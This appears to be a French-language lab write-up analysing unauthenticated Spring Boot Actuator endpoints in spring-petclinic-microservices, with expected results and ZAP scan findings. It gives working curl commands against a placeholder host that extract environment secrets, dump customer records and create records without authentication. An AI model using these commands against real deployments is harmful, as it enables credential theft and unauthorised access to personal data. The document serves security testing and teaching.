# Attack Analysis — OWASP A05:2021 Security Misconfiguration

## Vulnérabilité

**Catégorie OWASP :** A05:2021 — Security Misconfiguration  
**Composant ciblé :** Spring Boot Actuator (spring-petclinic-microservices)  
**Sévérité :** Élevée  
**CWE :** CWE-16 (Configuration), CWE-200 (Exposure of Sensitive Information)

### Description

L'application `spring-petclinic-microservices` expose par défaut l'ensemble des
endpoints Spring Boot Actuator sans authentification. Ces endpoints révèlent des
informations critiques sur l'environnement d'exécution, les beans Spring, les
propriétés de configuration et les variables d'environnement — y compris des
credentials potentiellement sensibles.

---

## Vecteurs d'attaque

### Vecteur 1 — Divulgation des variables d'environnement
Accès à `/actuator/env` permet d'extraire toutes les propriétés d'environnement,
incluant les mots de passe de bases de données, clés d'API, et configuration réseau
interne.

### Vecteur 2 — Enumération de la surface applicative
`/actuator/beans` expose l'arbre complet des beans Spring, permettant à un attaquant
de cartographier précisément les composants déployés, leurs dépendances et les classes
utilisées — facilitant des attaques ciblées.

### Vecteur 3 — Manipulation de données sans authentification
Les endpoints REST métier (`/api/customer/owners`) acceptent des opérations CRUD
(GET, POST, PUT, DELETE) sans aucune vérification d'identité, permettant l'exfiltration
et la modification de données.

---

## Commandes de démonstration

### Pré-requis
```bash
export TARGET=<EC2_PUBLIC_IP>
```

### 1. Extraction des variables d'environnement
```bash
curl -s http://$TARGET:8080/actuator/env | python3 -m json.tool
```
**Impact :** Affiche les mots de passe, URLs de bases de données, tokens JWT, etc.

### 2. Enumération des beans Spring
```bash
curl -s http://$TARGET:8080/actuator/beans | python3 -m json.tool | head -100
```
**Impact :** Révèle l'architecture interne, les dépendances et les composants sensibles.

### 3. Exfiltration des données clients
```bash
curl -s http://$TARGET:8080/api/customer/owners | python3 -m json.tool
```
**Impact :** Accès non autorisé à la liste complète des propriétaires (PII).

### 4. Création d'un enregistrement sans authentification
```bash
curl -s -X POST http://$TARGET:8080/api/customer/owners \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "Attacker",
    "lastName": "Test",
    "address": "1337 Hacker Lane",
    "city": "CyberCity",
    "telephone": "0000000000"
  }' | python3 -m json.tool
```
**Impact :** Modification de données de production sans authentification ni autorisation.

### 5. Accès aux métriques Prometheus
```bash
curl -s http://$TARGET:8080/actuator/prometheus | head -50
```
**Impact :** Métriques applicatives détaillées facilitant les attaques de performance.

---

## Résultats attendus

| Endpoint | Résultat attendu (vulnérable) | Code HTTP |
|----------|-------------------------------|-----------|
| `/actuator/env` | JSON avec toutes les propriétés env | 200 OK |
| `/actuator/beans` | JSON avec tous les beans Spring | 200 OK |
| `/actuator/mappings` | Carte complète des routes HTTP | 200 OK |
| `/api/customer/owners` | Liste JSON des propriétaires | 200 OK |
| `POST /api/customer/owners` | Création réussie sans auth | 201 Created |

---

## Analyse ZAP

Le scan OWASP ZAP Full Scan devrait identifier :
- **High** : Informations sensibles exposées via Actuator
- **Medium** : Absence de headers de sécurité (X-Frame-Options, CSP)
- **Medium** : Cross-Site Scripting potentiel via champs non sanitisés
- **Low** : X-Content-Type-Options manquant
